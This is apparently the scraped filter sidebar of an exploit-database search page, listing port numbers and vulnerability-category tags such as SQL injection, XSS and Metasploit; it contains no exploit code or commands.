2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


